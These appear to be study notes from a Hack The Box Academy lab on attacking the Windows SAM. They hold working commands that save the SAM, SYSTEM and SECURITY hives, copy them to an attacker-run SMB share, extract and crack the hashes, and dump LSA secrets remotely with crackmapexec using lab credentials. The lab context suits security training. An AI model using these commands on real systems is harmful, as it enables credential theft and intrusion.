# ATTACK SAM

## Copying SAM Registry Hives

hklm\sam : hashes associated with local account passwords
hklm\system : system bootkey, which is used to encrypt the SAM database
hklm\security : cached credentials for domain accounts

We can create backups of these hives using the **reg.exe** utility.

C:\WINDOWS\system32>
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save

## Transferring copies

On the Pwn Box :
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/

move sam.save \\$PWN_BOX$\CompData
move security.save \\$PWN_BOX$\CompData
move system.save \\$PWN_BOX$\\CompData

## Dumping Hashes with Impacket's secretsdump.py

locate secretsdump 
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

## Cracking Hashes with Hashcat

sudo vim hashestocrack.txt
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt

# Remote Dumping & LSA Secrets Considerations

crackmapexec smb $TARGET--local-auth -u bob -p HTB_@cademy_stdnt! --lsa

crackmapexec smb $TARGET --local-auth -u bob -p HTB_@cademy_stdnt! --sam

# LAB

xfreerdp /u:Bob /p:"HTB_@cademy_stdnt!" /v:$TARGET

sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/

move sam.save \\10.10.15.69\CompData
move security.save \\10.10.15.69\CompData
move system.save \\10.10.15.69\\CompData
